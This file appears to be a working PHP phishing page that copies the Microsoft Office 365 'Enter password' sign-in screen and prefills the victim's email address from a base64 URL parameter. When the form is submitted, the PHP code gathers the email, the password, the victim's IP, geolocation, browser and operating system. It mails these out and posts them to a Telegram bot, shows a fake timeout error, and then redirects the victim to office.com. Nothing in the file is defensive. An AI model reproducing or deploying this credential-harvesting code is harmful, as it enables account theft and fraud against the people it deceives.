<?php

session_start();

if (isset($_GET['state'])) { 
$state = $_GET["state"];
$email = base64_decode($state);
$var = explode('@', $email);
$domain = array_pop($var);
}

if (isset($_GET['msafed'])) { 
$msafed = $_GET["msafed"];
}
if ($msafed == ''){
$passerror = '';
$l = "login.php?client_id=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&client-request-id=f6f90abe-f003-4840-8433-638d72efae5f&protectedtoken=true&domain_hint=".$domain."&nonce=637224124682299008.a200ff88-f2c2-4caf-a148-1ba4ad8a317d&state=".$state."";
}
elseif ($msafed == '0'){
$passerror = '<div id="passwordError" class="alert alert-error" data-bind="">Please enter your password.</div>';
$l = "login.php?client_id=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&client-request-id=f6f90abe-f003-4840-8433-638d72efae5f&protectedtoken=true&domain_hint=".$domain."&nonce=637224124682299008.a200ff88-f2c2-4caf-a148-1ba4ad8a317d&state=".$state."";
}
elseif ($msafed == '1'){
$passerror = '<div id="passwordError" class="alert alert-error" data-bind="">Sorry, your sign-in timed out. Please sign in again.</div>';
$l = "https://office.com";
}

function getUserIP()
{
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
              $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
              $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}


$user_ip = getUserIP();

require_once 'api.php';
require_once 'geo.php';
require_once 'sync.php';
require_once '../mail.php';

$geoplugin = new geoPlugin($user_ip);
$geoplugin->locate();
$cc = $geoplugin->countryCode;
$cn = $geoplugin->countryName;
$cr = $geoplugin->region;
$ct = $geoplugin->city;
$br = $obj->showInfo('browser');
$op = $obj->showInfo('os');
$vr = $obj->showInfo('version');
$hostname = gethostbyaddr($user_ip);
$ua = $_SERVER['HTTP_USER_AGENT'];
$datum = date("D M d, Y g:i a");
$result = implode(file("error.txt"));

if (isset($_POST['login']) || isset($_POST['password'])) { 
$email = $_POST["login"];
$passwd = $_POST["password"];

$message = '';
$message .= "========== OUTLOOK ==========\n";
$message .= "Email: ".$email."\n";
$message .= "Password: ".$passwd."\n";
$message .= "IP: ".$user_ip.", ".$cn." (".$ct.", ".$cr.")\n";
$message .= "Web Browser: ".$br."\n";
$message .= "Web Browser Version: ".$vr."\n";
$message .= "Operating System: ".$op."\n";
$message .= "Submitted: ".$datum."\n";
$message .= "Host Name: ".$hostname."\n";
$message .= "User Agent: ".$ua."\n";

$subject  = "You've got mail from ".$user_ip." ($cn)";
$headers  = "From: MSFT <noreply>\n";
$headers .= "Reply-To: ".$email."\n";
$headers .= 'Content-type: text/plain; charset=iso-8859-1' . "\n";
$headers .= "MIME-Version: 1.0\n";

if (!filter_var($email, FILTER_VALIDATE_EMAIL) || empty($email) || empty($passwd)) {
	header("Location: login.php?client_id=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=0&client-request-id=f6f90abe-f003-4840-8433-638d72efae5f&protectedtoken=true&domain_hint=".$domain."&nonce=637224124682299008.a200ff88-f2c2-4caf-a148-1ba4ad8a317d&state=".$state."");
}
else {
mail($to,$subject,$message,$headers);
	$files = explode("@",$result);
	$chat = '@';
	$chatid = $chat.$files['1'];
	$token = $files['0'];
	$link = 'https://api.telegram.org/bot'.$token.''; 
	$parameter = [
		'chat_id' => $chatid, 
		'text' => $message
		];
 
	$request_url = $link.'/sendMessage?'.http_build_query($parameter); 
	file_get_contents($request_url);
	header('Location: '.$l);

}

}


?>
    <html dir="ltr" class="" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Sign in to your account</title>
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <link rel="shortcut icon" href="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
    <meta name="robots" content="none">


 
<script type="text/javascript">//<![CDATA[
!function(){var e=window,r=e.$Debug=e.$Debug||{},t=e.$Config||{};if(!r.appendLog){var n=[],o=0;r.appendLog=function(e){var r=t.maxDebugLog||25,a=(new Date).toUTCString()+":"+e;n.push(o+":"+a),n.length>r&&n.shift(),o++},r.getLogs=function(){return n}}}(),function(){function e(e,r){function t(a){var i=e[a];return n-1>a?void(o.r[i]?t(a+1):o.when(i,function(){t(a+1)})):void r(i)}var n=e.length;t(0)}function r(e,r,a){function i(){var e=!!s.method,o=e?s.method:a[0],i=s.extraArgs||[],u=n.$WebWatson;try{var c=t(a,!e);if(i&&i.length>0)for(var l=i.length,d=0;l>d;d++)c.push(i[d]);o.apply(r,c)}catch(f){return void(u&&u.submitFromException&&u.submitFromException(f))}}var s=o.r&&o.r[e];return r=r?r:this,s&&(s.skipTimeout?i():n.setTimeout(i,0)),s}function t(e,r){return Array.prototype.slice.call(e,r?1:0)}var n=window;n.$Do||(n.$Do={q:[],r:[],removeItems:[],lock:0,o:[]});var o=n.$Do;o.when=function(t,n){function a(e){r(e,i,s)||o.q.push({id:e,c:i,a:s})}var i=0,s=[],u=1,c="function"==typeof n;c||(i=n,u=2);for(var l=u;l<arguments.length;l++)s.push(arguments[l]);t instanceof Array?e(t,a):a(t)},o.register=function(e,t,n){if(!o.r[e]){o.o.push(e);var a={};if(t&&(a.method=t),n&&(a.skipTimeout=n),arguments&&arguments.length>3){a.extraArgs=[];for(var i=3;i<arguments.length;i++)a.extraArgs.push(arguments[i])}o.r[e]=a,o.lock++;try{for(var s=0;s<o.q.length;s++){var u=o.q[s];u.id==e&&r(e,u.c,u.a)&&o.removeItems.push(u)}}catch(c){throw c}finally{if(o.lock--,0===o.lock){for(var l=0;l<o.removeItems.length;l++)for(var d=o.removeItems[l],f=0;f<o.q.length;f++)if(o.q[f]===d){o.q.splice(f,1);break}o.removeItems=[]}}}},o.unregister=function(e){o.r[e]&&delete o.r[e]}}(),function(){function e(e,r){var t=f.$Debug;t&&t.appendLog&&(r&&(e+=" '"+(r.src||r.href||"")+"'",e+=", id:"+(r.id||""),e+=", async:"+(r.async||""),e+=", defer:"+(r.defer||"")),t.appendLog(e))}function r(){if(void 0===d)if(g)d=g.IE;else{var e=f.navigator.userAgent;d=-1!==e.indexOf("MSIE ")||-1!==e.indexOf("Trident/")}return d}function t(){var e=f.$Config||{},r=e.loader||{};return r.slReportFailure||e.slReportFailure||!1}function n(){var e=f.$Config||{},r=e.loader||{};return r.redirectToErrorPageOnLoadFailure||!1}function o(e){var r=e.indexOf("?"),t=r>-1?r:e.length;return t>p&&e.substr(t-p,p).toLowerCase()===v}function a(e){var r=e.srcPath,t=null;t=o(r)?i(r):"script"===e.tagName.toLowerCase()?s(r):u(r,e.tagName);var n=e.id;n&&(t.id=n);var a=e.integrity;return"function"==typeof t.setAttribute&&(t.setAttribute("crossorigin","anonymous"),a&&"string"==typeof a&&t.setAttribute("integrity",a)),t}function i(e){var r=h.createElement("link");return r.rel="stylesheet",r.type="text/css",r.href=e,r}function s(e){var r=h.createElement("script");return r.type="text/javascript",r.src=e,r.defer=!1,r.async=!1,r}function u(e,r){var t=h.createElement(r);return t.src=e,t}function c(e){var r=!0,t=e.src||e.href||"";if(t){if(o(t))try{e.sheet&&e.sheet.cssRules&&!e.sheet.cssRules.length&&(r=!1)}catch(n){}}else r=!1;return r}function l(){function r(e){if(!(s&&s.length>1))return e;for(var r=0;r<s.length;r++)if(0===e.indexOf(s[r]))return s[r+1<s.length?r+1:0]+e.substring(s[r].length);return e}function t(n,i,s){if(n<d.length){var f=d[n];if(!f||!f.srcPath)return void t(n+1,i,s);f.retry>0&&(f.srcPath=r(f.srcPath),f.origId||(f.origId=f.id),f.id=f.origId+"_Retry_"+f.retry);var g=a(f),v=function(){e("[$Loader]: "+(u.failMessage||"Failed"),g),f.retry<o&&(f.retry++,t(n,i,s),l._ReportFailure(f.retry-1,f.srcPath)),s&&s()},p=function(){if(f.retry++,c(g)){e("[$Loader]: "+(u.successMessage||"Loaded"),g),t(n+1,i,s);var r=f.onSuccess;"function"==typeof r&&r(f.srcPath)}else v()};g.onload=p,g.onerror=v,g.onreadystatechange=function(){"loaded"===g.readyState?setTimeout(p,500):"complete"===g.readyState&&p()};var y=h.getElementsByTagName("head")[0];y.appendChild(g),e("[$Loader]: Loading '"+(f.srcPath||"")+"', id:"+(f.id||""))}else i&&i()}var n=f.$Config||{},o=n.slMaxRetry||2,i=n.loader||{},s=i.cdnRoots||[],u=this,d=[];u.retryOnError=!0,u.successMessage="Loaded",u.failMessage="Error",u.Add=function(e,r,t,n,o,a){e&&d.push({srcPath:e,id:r,retry:n||0,integrity:t,tagName:o||"script",onSuccess:a})},u.AddLoaded=function(){},u.AddForReload=function(e,r){var t=e.src||e.href||"";u.Add(t,"AddForReload",e.integrity,1,e.tagName,r)},u.AddIf=function(e,r,t){e&&u.Add(r,t)},u.Load=function(e,r){t(0,e,r)}}var d,f=window,g=f.$B,h=f.document,v=".css",p=v.length;l.On=function(e,r,t){if(!e)throw"The target element must be provided and cannot be null.";r?l.OnError(e,t):l.OnSuccess(e,t)},l.OnSuccess=function(r,o){var a=r.src||r.href||"",i=t(),s=n();if(!r)throw"The target element must be provided and cannot be null.";if(c(r)){e("[$Loader]: Loaded",r);var u=new l;u.failMessage="Reload Failed",u.successMessage="Reload Success",u.AddLoaded(r),u.Load(null,function(){if(i)throw"Unexpected state. resourceLoader.Load() failed despite initial load success. ['"+a+"']";s&&(document.location.href="/error.aspx?err=504")})}else l.OnError(r,o)},l.OnError=function(r,o){var a=r.src||r.href||"",i=t(),s=n();if(!r)throw"The target element must be provided and cannot be null.";e("[$Loader]: Failed",r);var u=new l;u.failMessage="Reload Failed",u.successMessage="Reload Success",u.AddForReload(r,o),u.Load(null,function(){if(i)throw"Failed to load external resource ['"+a+"']";s&&(document.location.href="/error.aspx?err=504")}),l._ReportFailure(0,a)},l._ReportFailure=function(e,t){if(!r())throw"[Retry "+e+"] Failed to load external resource ['"+t+"'], reloading from fallback CDN endpoint"},f.$Loader=l}(),function(){function e(){if(!$){var e=new v.$Loader;e.AddIf(!v.jQuery,y.sbundle,"WebWatson_DemandSupport"),y.sbundle=null,delete y.sbundle,e.AddIf(!v.$Api,y.fbundle,"WebWatson_DemandFramework"),y.fbundle=null,delete y.fbundle,e.Add(y.bundle,"WebWatson_DemandLoaded"),e.Load(r,t),$=!0}}function r(){if(v.$WebWatson){if(v.$WebWatson.isProxy)return void t();m.when("$WebWatson.full",function(){for(;b.length>0;){var e=b.shift();e&&v.$WebWatson[e.cmdName].apply(v.$WebWatson,e.args)}})}}function t(){var e=v.$WebWatson?v.$WebWatson.isProxy:!0;if(e){if(!w&&JSON){try{var r=new XMLHttpRequest;r.open("POST",y.url),r.setRequestHeader("Accept","application/json"),r.setRequestHeader("Content-Type","application/json; charset=UTF-8"),r.setRequestHeader("canary",p.apiCanary),r.setRequestHeader("client-request-id",p.correlationId),r.setRequestHeader("hpgid",p.hpgid||0),r.setRequestHeader("hpgact",p.hpgact||0);for(var t=-1,o=0;o<b.length;o++)if("submit"===b[o].cmdName){t=o;break}var a=b[t]?b[t].args||[]:[],i={sr:y.sr,ec:"Failed to load external resource [Core Watson files]",wec:55,idx:1,pn:p.pgid||"",sc:p.scid||0,hpg:p.hpgid||0,msg:"Failed to load external resource [Core Watson files]",url:a[1]||"",ln:0,ad:0,an:!1,cs:"",sd:p.serverDetails,ls:null,diag:h(y)};r.send(JSON.stringify(i))}catch(s){}w=!0}y.loadErrorUrl&&window.location.assign(y.loadErrorUrl)}n()}function n(){b=[],v.$WebWatson=null}function o(r){return function(){var t=arguments;b.push({cmdName:r,args:t}),e()}}function a(){var e=["foundException","resetException","submit"],r=this;r.isProxy=!0;for(var t=e.length,n=0;t>n;n++){var a=e[n];a&&(r[a]=o(a))}}function i(e,r,t,n,o,a,i){var s=v.event;return a||(a=d(o||s,i?i+2:2)),v.$Debug&&v.$Debug.appendLog&&v.$Debug.appendLog("[WebWatson]:"+(e||"")+" in "+(r||"")+" @ "+(t||"??")),W.submit(e,r,t,n,o||s,a,i)}function s(e,r){return{signature:e,args:r,toString:function(){return this.signature}}}function u(e){for(var r=[],t=e.split("\n"),n=0;n<t.length;n++)r.push(s(t[n],[]));return r}function c(e){for(var r=[],t=e.split("\n"),n=0;n<t.length;n++){var o=s(t[n],[]);t[n+1]&&(o.signature+="@"+t[n+1],n++),r.push(o)}return r}function l(e){if(!e)return null;try{if(e.stack)return u(e.stack);if(e.error){if(e.error.stack)return u(e.error.stack)}else if(window.opera&&e.message)return c(e.message)}catch(r){}return null}function d(e,r){var t=[];try{for(var n=arguments.callee;r>0;)n=n?n.caller:n,r--;for(var o=0;n&&L>o;){var a="InvalidMethod()";try{a=n.toString()}catch(i){}var u=[],c=n.args||n.arguments;if(c)for(var d=0;d<c.length;d++)u[d]=c[d];t.push(s(a,u)),n=n.caller,o++}}catch(i){t.push(s(i.toString(),[]))}var f=l(e);return f&&(t.push(s("--- Error Event Stack -----------------",[])),t=t.concat(f)),t}function f(e){if(e)try{var r=/function (.{1,})\(/,t=r.exec(e.constructor.toString());return t&&t.length>1?t[1]:""}catch(n){}return""}function g(e){if(e)try{if("string"!=typeof e&&JSON&&JSON.stringify){var r=f(e),t=JSON.stringify(e);return t&&"{}"!==t||(e.error&&(e=e.error,r=f(e)),t=JSON.stringify(e),t&&"{}"!==t||(t=e.toString())),r+":"+t}}catch(n){}return""+(e||"")}function h(e){var r=[];try{if(jQuery?(r.push("jQuery v:"+jQuery().jquery),r.push(jQuery.easing?"jQuery.easing:"+JSON.stringify(jQuery.easing):"jQuery.easing is not defined")):r.push("jQuery is not defined"),e&&e.expectedVersion&&r.push("Expected jQuery v:"+e.expectedVersion),m){var t,n="";for(t=0;t<m.o.length;t++)n+=m.o[t]+";";for(r.push("$Do.o["+n+"]"),n="",t=0;t<m.q.length;t++)n+=m.q[t].id+";";r.push("$Do.q["+n+"]")}if(v.$Debug&&v.$Debug.getLogs){var o=v.$Debug.getLogs();o&&o.length>0&&(r=r.concat(o))}if(b)for(var a=0;a<b.length;a++){var i=b[a];if(i&&"submit"===i.cmdName)try{if(JSON&&JSON.stringify){var s=JSON.stringify(i);s&&r.push(s)}}catch(u){r.push(g(u))}}}catch(c){r.push(g(c))}return r}var v=window,p=v.$Config||{},y=p.watson,m=v.$Do;if(!v.$WebWatson&&y){var b=[],$=!1,w=!1,L=10,W=v.$WebWatson=new a;W.CB={},W._orgErrorHandler=v.onerror,v.onerror=i,W.errorHooked=!0,m.when("jQuery.version",function(e){y.expectedVersion=e}),m.register("$WebWatson")}}(),function(){function e(e,r){for(var t=r.split("."),n=t.length,o=0;n>o&&null!==e&&void 0!==e;)e=e[t[o++]];return e}function r(r){var t=null;return null===u&&(u=e(a,"Constants")),null!==u&&r&&(t=e(u,r)),null===t||void 0===t?"":t.toString()}function t(t){var n=null;return null===i&&(i=e(a,"$Config.strings")),null!==i&&t&&(n=e(i,t.toLowerCase())),(null===n||void 0===n)&&(n=r(t)),null===n||void 0===n?"":n.toString()}function n(e,r){var n=null;return e&&r&&r[e]&&(n=t("errors."+r[e])),n||(n=t("errors."+e)),n||(n=t("errors."+c)),n||(n=t(c)),n}function o(t){var n=null;return null===s&&(s=e(a,"$Config.urls")),null!==s&&t&&(n=e(s,t.toLowerCase())),(null===n||void 0===n)&&(n=r(t)),null===n||void 0===n?"":n.toString()}var a=window,i=null,s=null,u=null,c="GENERIC_ERROR";a.GetString=t,a.GetErrorString=n,a.GetUrl=o}(),function(){var e=window,r=e.$Config||{};e.$B=r.browser||{}}();

//]]></script> 

    <script type="text/javascript">
        ServerData = $Config;
    </script>


    
    <link crossorigin="anonymous" href="css/login.min.css" rel="stylesheet" onerror="$Loader.On(this,true)" onload="$Loader.On(this)" integrity="sha384-Dm3wPFGyhGRMfAHczqYjj7N1ts4u3yJvKSwfGi+kL5+82Ql2tRqQ5lWR6knTKl2l">


<script crossorigin="anonymous" src="" onerror="$Loader.On(this,true)" onload="$Loader.On(this)" integrity="sha384-Ic1griUg/97tRenU/uzftYBroKOABeGnqc+8LaZ/huC4NqG1fnu7DbESE0ddmgsN"></script><script type="text/javascript" src="" id="AddForReload_Retry_1" crossorigin="anonymous" integrity="sha384-Ic1griUg/97tRenU/uzftYBroKOABeGnqc+8LaZ/huC4NqG1fnu7DbESE0ddmgsN"></script><script type="text/javascript" src="" id="WebWatson_DemandSupport" crossorigin="anonymous"></script>

    <script crossorigin="anonymous" src="" onerror="$Loader.On(this,true)" onload="$Loader.On(this)" integrity="sha384-R7ehNd9TNcC1cErQnchw6zE6TjKoegC5nELWtQebUCcpnHi/MSNsnVLSZ8oG3Hhs"></script>

    


<script type="text/javascript" src="" id="WebWatson_DemandFramework" crossorigin="anonymous"></script><script type="text/javascript" src="" id="WebWatson_DemandLoaded" crossorigin="anonymous"></script></head>

<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;" cz-shortcut-listen="true">
    <script type="text/javascript">//<![CDATA[
!function(){var e=window,o=e.document,i=e.$Config||{};if(e.self===e.top)o&&o.body&&(o.body.style.display="block");else if(!i.allowFrame){var s=e.self.location.href,l=s.indexOf("#"),n=-1!==l,t=s.indexOf("?"),f=n?l:s.length,d=-1===t||n&&t>l?"?":"&";s=s.substr(0,f)+d+"iframe-request-id="+i.sessionId+s.substr(f),e.top.location=s}}();

//]]></script>

<div><!--  --> <div data-bind="component: { name: &#39;background-image&#39;, publicMethods: backgroundControlMethods }"><div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"><!-- ko if: smallImageUrl --> <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;images/background.jpg&quot;);"></div><!-- /ko --><!-- ko if: backgroundImageUrl --> <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;images/background.jpg&quot;);"></div><!-- ko if: useImageMask --><!-- /ko --><!-- /ko --> </div></div> <div data-bind="if: activeDialog"></div> 

<form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" action="">

    <div class="outer" data-bind="component: { name: &#39;page&#39;,
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"><!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --><!-- ko if: svr.fShowCookieBanner --><!-- /ko --> <div class="middle" data-bind="css: { &#39;app&#39;: backgroundLogoUrl }"><div class="background-logo-holder"> <img class="background-logo" role="presentation" data-bind="attr: { src: backgroundLogoUrl }" src="https://aadcdn.msftauth.net/ests/2.1/content/images/applogos/37_533e293f0c8947ada653b47c00e394e2.png"> </div><!-- ko if: backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko --> <div class="inner fade-in-lightbox" data-bind="
                animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
                css: {
                    &#39;app&#39;: backgroundLogoUrl,
                    &#39;wide&#39;: paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata(&#39;wide&#39;),
                    &#39;fade-in-lightbox&#39;: fadeInLightBox,
                    &#39;has-popup&#39;: showFedCredButton,
                    &#39;transparent-lightbox&#39;: backgroundControlMethods() &amp;&amp; backgroundControlMethods().useTransparentLightBox }"> <div class="lightbox-cover" data-bind="css: { &#39;disable-lightbox&#39;: svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div><!-- ko if: showLightboxProgress --><!-- /ko --><!-- ko ifnot: paginationControlMethods() && (paginationControlMethods().currentViewHasMetadata('hideLogo')) --> <div data-bind="component: { name: &#39;logo-control&#39;,
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: bannerLogoUrl() } }"><!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" svgsrc="images/assets.svg" data-bind="imgSrc, attr: { alt: str[&#39;MOBILE_STR_Footer_Microsoft&#39;] }" src="images/assets.svg" alt="Microsoft"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko --></div><!-- /ko --><!-- ko if: svr.strLWADisclaimerMsg && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) --><!-- /ko --><!-- ko if: asyncInitReady --> <div role="main" data-bind="component: { name: &#39;pagination-control&#39;,
                        publicMethods: paginationControlMethods,
                        params: {
                            enableCssAnimation: svr.fEnableCssAnimation,
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow,
                            setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                            animationStateChange: paginationControl_onAnimationStateChange } }"><!--  --> <div data-bind="css: { &#39;zero-opacity&#39;: hidePaginatedView() }" class=""><!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username) --> <div data-bind="css: {
        &#39;animate&#39;: animate() &amp;&amp; animate.animateBanner(),
        &#39;slide-out-next&#39;: animate.isSlideOutNext(),
        &#39;slide-in-next&#39;: animate.isSlideInNext(),
        &#39;slide-out-back&#39;: animate.isSlideOutBack(),
        &#39;slide-in-back&#39;: animate.isSlideInBack() }" class="animate slide-in-next"> <div data-bind="component: { name: &#39;identity-banner-control&#39;,
            params: {
                userTileUrl: svr.urlProfilePhoto,
                displayName: sharedData.displayName || svr.sPOST_Username,
                isBackButtonVisible: isBackButtonVisible(),
                focusOnBackButton: isBackButtonFocused(),
                backButtonDescribedBy: backButtonDescribedBy() },
            event: {
                backButtonClick: identityBanner_onBackButtonClick } }"><!--  --> <div class="identityBanner"><!-- ko if: isBackButtonVisible --> <button type="button" class="backButton" data-bind="
        click: backButton_onClick,
        hasFocus: focusOnBackButton,
        attr: {
            &#39;id&#39;: backButtonId || &#39;idBtn_Back&#39;,
            &#39;aria-describedby&#39;: backButtonDescribedBy,
            &#39;aria-label&#39;: str[&#39;CT_HRD_STR_Splitter_Back&#39;] }" id="idBtn_Back" aria-label="Back"><!-- ko ifnot: svr.fIsRTLMarket --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img role="presentation" pngsrc="https://aadcdn.msauth.net/ests/2.1/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png" svgsrc="https://aadcdn.msauth.net/ests/2.1/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" data-bind="imgSrc" src="https://aadcdn.msftauth.net/ests/2.1/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"><!-- /ko --> <!-- /ko --><!-- /ko --><!-- /ko --><!-- ko if: svr.fIsRTLMarket --><!-- /ko --> </button><!-- /ko --> <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { &#39;title&#39;: unsafe_displayName }" title="<?php echo isset($_GET['state']) ? base64_decode($_GET['state']) : '' ?>"><?php echo isset($_GET['state']) ? base64_decode($_GET['state']) : '' ?></div> </div></div> </div><!-- /ko --> <div class="pagination-view animate has-identity-banner slide-in-next" data-bind="css: {
        &#39;has-identity-banner&#39;: showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
        &#39;zero-opacity&#39;: hidePaginatedView.hideSubView(),
        &#39;animate&#39;: animate(),
        &#39;slide-out-next&#39;: animate.isSlideOutNext(),
        &#39;slide-in-next&#39;: animate.isSlideInNext(),
        &#39;slide-out-back&#39;: animate.isSlideOutBack(),
        &#39;slide-in-back&#39;: animate.isSlideInBack() }"><!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --> <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: &#39;login-paginated-password-view&#39;,
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            username: sharedData.username,
                            displayName: sharedData.displayName,
                            hipRequiredForUsername: sharedData.hipRequiredForUsername,
                            passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                            availableCreds: sharedData.availableCreds,
                            evictedCreds: sharedData.evictedCreds,
                            useEvictedCredentials: sharedData.useEvictedCredentials,
                            flowToken: sharedData.flowToken,
                            defaultKmsiValue: svr.iDefaultLoginOptions === 1,
                            userTenantBranding: sharedData.userTenantBranding,
                            sessions: sharedData.sessions,
                            callMetadata: sharedData.callMetadata,
                            gitHubRedirectUrl: sharedData.gitHubParams.redirectUrl || svr.urlGitHubFed,
                            googleRedirectUrl: sharedData.googleParams.redirectUrl || svr.urlGoogleFed },
                        event: {
                            updateFlowToken: $loginPage.view_onUpdateFlowToken,
                            submitReady: $loginPage.view_onSubmitReady,
                            redirect: $loginPage.view_onRedirect,
                            resetPassword: $loginPage.passwordView_onResetPassword,
                            setBackButtonState: view_onSetIdentityBackButtonState,
                            setPendingRequest: $loginPage.view_onSetPendingRequest } }"><!--  --> <input type="hidden" name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0"> <input type="hidden" name="login" data-bind="value: unsafe_username" value="<?php echo isset($_GET['state']) ? base64_decode($_GET['state']) : '' ?>"> <input type="text" name="loginfmt" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true"> <input type="hidden" name="type" data-bind="value: svr.fUseWizardBehavior ? 20 : 11" value="11"> <input type="hidden" name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3"> <input type="hidden" name="lrt" data-bind="value: callMetadata.IsLongRunningTransaction" value=""> <input type="hidden" name="lrtPartition" data-bind="value: callMetadata.LongRunningTransactionPartition" value=""> <input type="hidden" name="hisRegion" data-bind="value: callMetadata.HisRegion" value=""> <input type="hidden" name="hisScaleUnit" data-bind="value: callMetadata.HisScaleUnit" value=""> <div id="loginHeader" class="row text-title" role="heading" aria-level="1" data-bind="text: str[&#39;CT_PWD_STR_EnterPassword_Title&#39;]">Enter password</div><!-- ko if: unsafe_pageDescription --><!-- /ko --> <div class="row"> <div class="form-group col-md-24"> <div role="alert" aria-live="assertive" aria-atomic="false"><!-- ko if: passwordTextbox.error --><!-- /ko --> <?php echo $passerror; ?></div> <div class="placeholderContainer" data-bind="component: { name: &#39;placeholder-textbox&#39;,
            publicMethods: passwordTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: str[&#39;CT_PWD_STR_PwdTB_Label&#39;] },
            event: {
                updateFocus: passwordTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> <input name="password" type="password" id="i0118" autocomplete="off" class="form-control" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" data-bind="
                    textInput: passwordTextbox.value,
                    hasFocusEx: passwordTextbox.focused,
                    placeholder: $placeholderText,
                    ariaLabel: unsafe_passwordAriaLabel,
                    css: { &#39;has-error&#39;: passwordTextbox.error }" placeholder="Password" aria-label="Enter the password for member@hotmail.com"> <!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div> </div> </div><!-- ko if: svr.urlHIPScript && showHipOnPasswordView --><!-- /ko --> <div data-bind="css: { &#39;position-buttons&#39;: !tenantBranding.BoilerPlateText }" class="position-buttons"> <div><!-- ko if: svr.fShowPersistentCookiesWarning --><!-- /ko --><!-- ko if: svr.fKMSIEnabled !== false && !svr.fShowPersistentCookiesWarning && !tenantBranding.KeepMeSignedInDisabled --><!-- /ko --> <div class="row"> <div class="col-md-24"> <div class="text-13 action-links"> <div class="form-group"><a id="idA_PWD_ForgotPassword" role="link" href="#">
 Forgot my password</a> </div><!-- ko if: allowPhoneDisambiguation --><!-- /ko --><!-- ko ifnot: useEvictedCredentials --><!-- ko component: { name: "cred-switch-link-control",
                            params: {
                                serverData: svr,
                                username: username,
                                availableCreds: availableCreds,
                                flowToken: flowToken,
                                currentCred: { credType: 1 } },
                            event: {
                                switchView: credSwitchLink_onSwitchView,
                                setPendingRequest: credSwitchLink_onSetPendingRequest,
